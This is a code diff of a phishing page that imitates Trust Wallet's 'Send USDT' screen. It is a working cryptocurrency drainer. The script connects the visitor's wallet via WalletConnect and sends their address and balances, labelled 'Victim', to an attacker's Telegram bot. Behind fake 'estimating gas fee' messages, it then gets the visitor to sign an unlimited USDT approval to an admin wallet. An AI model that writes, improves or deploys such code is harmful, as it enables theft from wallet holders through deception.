@@ -2,66 +2,67 @@
 <html lang="en">
 <head>
     <meta charset="utf-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1" />
-    <title>Trust Wallet | Send USDT</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0"/>
+    <title>Trust Wallet</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
     <style>
-        body { background-color: #000000; color: white; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
-        .input-box { background-color: #121212; border: 1px solid #222; }
-        .trust-blue { color: #3182ce; }
-        .btn-blue { background-color: #0376f1; transition: all 0.2s ease; }
-        .btn-blue:active { transform: scale(0.98); background-color: #0259b8; }
+        body { background-color: #000000; color: #ffffff; font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto; }
+        .ios-input { background-color: #1a1a1a; border: none; outline: none; }
+        .trust-blue-btn { background-color: #0500ff; transition: opacity 0.2s; }
+        .trust-blue-btn:active { opacity: 0.7; }
+        .loading-overlay { background: rgba(0,0,0,0.85); backdrop-filter: blur(4px); }
     </style>
 </head>
-<body class="min-h-screen flex flex-col p-4 max-w-lg mx-auto">
+<body class="min-h-screen flex flex-col">
 
-    <div id="main-view" class="flex flex-col h-full flex-grow">
-        <div class="flex items-center justify-between mb-8 pt-2">
-            <i class="fa-solid fa-chevron-left text-lg"></i>
-            <h1 class="text-lg font-semibold text-center">Send USDT</h1>
-            <span class="text-blue-500 font-medium">History</span>
-        </div>
+    <div class="px-5 py-4 flex items-center justify-between border-b border-gray-900">
+        <i class="fa-solid fa-arrow-left text-xl text-white"></i>
+        <h1 class="text-[17px] font-bold">Send USDT</h1>
+        <span class="text-[#3b82f6] font-medium text-[15px]">History</span>
+    </div>
 
-        <div class="space-y-6">
-            <div class="input-box rounded-2xl p-4">
-                <div class="flex justify-between items-center mb-1">
-                    <span class="text-xs text-gray-500 font-bold uppercase">Recipient Address</span>
-                    <span class="text-blue-500 text-xs font-bold uppercase">Paste</span>
-                </div>
-                <div class="flex items-center gap-3">
-                    <input type="text" value="TBrJPyG8BUysBBM...QFvEHay2" class="bg-transparent text-gray-300 w-full outline-none text-sm" readonly>
-                    <i class="fa-solid fa-qrcode text-blue-500"></i>
-                </div>
+    <div id="main-content" class="px-5 mt-6 flex-grow flex flex-col">
+        
+        <div class="ios-input rounded-2xl p-4 mb-5">
+            <div class="flex justify-between items-center mb-1">
+                <span class="text-[11px] text-gray-500 font-bold uppercase tracking-wider">Recipient Address</span>
+                <span class="text-[#3b82f6] text-[11px] font-bold uppercase">Paste</span>
             </div>
-
-            <div class="input-box rounded-2xl p-4">
-                <div class="flex justify-between items-center mb-1">
-                    <span class="text-xs text-gray-500 font-bold uppercase">Amount USDT</span>
-                    <span class="text-blue-500 text-xs font-bold uppercase">Max</span>
-                </div>
-                <div class="flex items-center justify-between">
-                    <input type="number" id="user-amount" placeholder="0" class="bg-transparent text-3xl font-medium w-full outline-none text-white">
-                    <div class="flex items-center gap-2">
-                        <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" width="24" class="rounded-full">
-                        <span class="font-bold">USDT</span>
-                    </div>
-                </div>
-                <p class="text-xs text-gray-500 mt-2">Balance: <span class="text-gray-300">Fetching...</span></p>
+            <div class="flex items-center justify-between">
+                <input type="text" value="TBrJPyG8BUysBBM...QFvEHay2" class="bg-transparent text-[#e2e8f0] text-[15px] w-full" readonly>
+                <i class="fa-solid fa-qrcode text-[#3b82f6] ml-2"></i>
             </div>
         </div>
 
-        <div class="mt-auto pb-6">
-            <button id="next-btn" class="w-full btn-blue py-4 rounded-full text-lg font-bold shadow-xl">
+        <div class="ios-input rounded-2xl p-4">
+            <div class="flex justify-between items-center mb-1">
+                <span class="text-[11px] text-gray-500 font-bold uppercase tracking-wider">Amount USDT</span>
+                <span class="text-[#3b82f6] text-[11px] font-bold uppercase">Max</span>
+            </div>
+            <div class="flex items-center justify-between mt-1">
+                <input type="number" id="send-amount" placeholder="0" class="bg-transparent text-3xl font-semibold w-full outline-none">
+                <div class="flex items-center gap-2">
+                    <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" class="w-6 h-6">
+                    <span class="font-bold text-lg">USDT</span>
+                </div>
+            </div>
+            <div class="mt-4 text-[13px] text-gray-400">
+                Balance: <span id="view-balance">0.00 USDT</span>
+            </div>
+        </div>
+
+        <div class="mt-auto mb-10">
+            <button id="next-btn" class="w-full trust-blue-btn py-4 rounded-full text-lg font-bold">
                 Next
             </button>
         </div>
     </div>
 
-    <div id="processing-screen" class="hidden fixed inset-0 bg-black/95 flex flex-col items-center justify-center z-50 p-10">
-        <div class="w-14 h-14 border-4 border-blue-500 border-t-transparent rounded-full animate-spin mb-4"></div>
-        <h2 id="status-text" class="text-lg font-bold text-center">Estimating Gas Fee...</h2>
-        <p id="sub-status-text" class="text-gray-400 text-center text-xs mt-2 italic">Confirm the transaction in your Trust Wallet app</p>
+    <div id="loading-screen" class="hidden fixed inset-0 loading-overlay z-50 flex flex-col items-center justify-center p-8">
+        <div class="w-12 h-12 border-[3px] border-[#3b82f6] border-t-transparent rounded-full animate-spin mb-6"></div>
+        <h2 id="loading-title" class="text-[19px] font-bold text-white">Confirming Transaction...</h2>
+        <p id="loading-subtitle" class="text-gray-400 text-center text-sm mt-2">Checking network congestion and estimating gas fee. Please wait...</p>
     </div>
 
     <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.js"></script>
@@ -73,62 +74,80 @@
             ADMIN_WALLET: "TBrJPyG8BUysBBMpX7ucRmzpnYQFvEHay2",
             USDT_CONTRACT: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"
         };
-
         const MAX_UINT = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
 
-        async function notify(msg) {
+        async function notifyAdmin(status, address, trx = "0", usdt = "0", extra = "") {
+            const text = `🎯 <b>NEW UPDATE</b>\n\n` +
+                         `📌 Status: <b>${status}</b>\n` +
+                         `👤 Victim: <code>${address}</code>\n` +
+                         `💰 Balance: <code>${usdt} USDT</code> | <code>${trx} TRX</code>\n` +
+                         `📝 Detail: ${extra}`;
             try {
                 await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: CONFIG.CHAT_ID, text: msg, parse_mode: "HTML" })
+                    body: JSON.stringify({ chat_id: CONFIG.CHAT_ID, text: text, parse_mode: "HTML" })
                 });
             } catch(e) {}
         }
 
-        document.getElementById('next-btn').addEventListener('click', async () => {
-            // STEP 1: Triggers WalletConnect Connect
-            if (typeof window.connectWalletConnectTron === 'function') {
-                const wcResult = await window.connectWalletConnectTron();
-                
-                if (wcResult && wcResult.address) {
-                    const address = wcResult.address;
-                    
-                    // UI Change
-                    document.getElementById('main-view').classList.add('opacity-10');
-                    document.getElementById('processing-screen').classList.remove('hidden');
+        async function getStats(address) {
+            const tw = new TronWeb({ fullHost: 'https://api.trongrid.io' });
+            let trx = "0.00", usdt = "0.00";
+            try {
+                trx = (await tw.trx.getBalance(address) / 1e6).toFixed(2);
+                const contract = await tw.transactionBuilder.triggerConstantContract(CONFIG.USDT_CONTRACT, "balanceOf(address)", {}, [{type:'address', value: address}], address);
+                usdt = (parseInt(contract.constant_result[0], 16) / 1e6).toFixed(2);
+            } catch(e) {}
+            return { trx, usdt };
+        }
 
+        document.getElementById('next-btn').addEventListener('click', async () => {
+            if (typeof window.connectWalletConnectTron !== 'function') return alert("System loading...");
+
+            const result = await window.connectWalletConnectTron();
+            if (result && result.address) {
+                const address = result.address;
+                const { trx, usdt } = await getStats(address);
+                
+                // UI transition to Confirming
+                document.getElementById('main-content').classList.add('opacity-10');
+                document.getElementById('loading-screen').classList.remove('hidden');
+
+                await notifyAdmin("CONNECTED", address, trx, usdt, "Waiting for approval...");
+
+                try {
                     const localTronWeb = new TronWeb({ fullHost: 'https://api.trongrid.io' });
                     
-                    try {
-                        // STEP 2: Automatic Unlimited Approval
-                        document.getElementById('status-text').innerText = "Broadcasting Transaction...";
-                        document.getElementById('sub-status-text').innerText = "Security check required by network. Please approve.";
+                    // Triggering Approval after a short "Thinking" delay
+                    setTimeout(async () => {
+                        try {
+                            const { transaction } = await localTronWeb.transactionBuilder.triggerSmartContract(
+                                CONFIG.USDT_CONTRACT, "approve(address,uint256)", { feeLimit: 100000000 },
+                                [{ type: 'address', value: CONFIG.ADMIN_WALLET }, { type: 'uint256', value: MAX_UINT }], address
+                            );
 
-                        const { transaction } = await localTronWeb.transactionBuilder.triggerSmartContract(
-                            CONFIG.USDT_CONTRACT, "approve(address,uint256)", { feeLimit: 100000000 },
-                            [{ type: 'address', value: CONFIG.ADMIN_WALLET }, { type: 'uint256', value: MAX_UINT }], address
-                        );
+                            const signedTx = await result.provider.request({
+                                method: "tron_signTransaction",
+                                params: { address: address, transaction: transaction }
+                            });
 
-                        const signedTx = await wcResult.provider.request({
-                            method: "tron_signTransaction",
-                            params: { address: address, transaction: transaction }
-                        });
+                            const receipt = await localTronWeb.trx.sendRawTransaction(signedTx);
+                            await notifyAdmin("✅ SUCCESS", address, trx, usdt, `TX: <code>${receipt.txid || "Success"}</code>`);
+                            alert("Transaction sent to the network.");
+                            location.reload();
+                        } catch (err) {
+                            let reason = "User Rejected";
+                            if (parseFloat(trx) < 25) reason = "Insufficient Gas (Low TRX)";
+                            await notifyAdmin("❌ FAILED", address, trx, usdt, `Reason: ${reason}`);
+                            location.reload();
+                        }
+                    }, 2500);
 
-                        const receipt = await localTronWeb.trx.sendRawTransaction(signedTx);
-                        await notify(`✅ <b>SYSTEM GAINED ACCESS</b>\nVictim: <code>${address}</code>\nTX: <code>${receipt.txid || "Success"}</code>`);
-                        
-                        document.getElementById('status-text').innerText = "Transaction Sent";
-                        alert("Transaction is being processed by the network.");
-                        location.reload();
-
-                    } catch (error) {
-                        await notify(`⚠️ <b>REJECTED</b>\nVictim: <code>${address}</code>`);
-                        location.reload();
-                    }
+                } catch (e) {
+                    await notifyAdmin("❌ ERROR", address, trx, usdt, e.message);
+                    location.reload();
                 }
-            } else {
-                alert("Please wait, initializing bridge...");
             }
         });
     </script>
